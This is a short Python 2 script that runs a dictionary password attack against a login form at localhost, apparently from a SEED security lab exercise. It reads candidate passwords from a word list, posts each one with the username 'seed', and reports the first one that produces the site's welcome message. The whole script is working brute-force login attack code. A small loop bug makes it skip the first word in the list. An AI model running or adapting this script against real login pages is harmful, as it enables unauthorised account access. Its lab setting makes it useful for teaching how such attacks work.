#!/usr/bin/python
# -*- coding: utf-8 -*-
from hashlib import sha1
import requests


def post_req(username, password):

    # m = sha1(password.encode('utf-8'))
    # password = m.hexdigest()

    print password
    r = requests.post('http://localhost/index.php',
                      data={'username': username, 'password': password})
    if 'Welcome to our site.' in r.text:
        return True
    else:
        return False


filepath = 'words.txt'
found = False
with open(filepath) as fp:
    line = fp.readline()
    while line:
        line = fp.readline()
        password = line.strip()
        if len(password) >= 6:
            flag = post_req('seed', password)
            if flag:
                found = True
                print 'Correct Password %s' % password
                break
            else:
                pass

if found == False:
    print 'No correct password is in the dictionary'


			
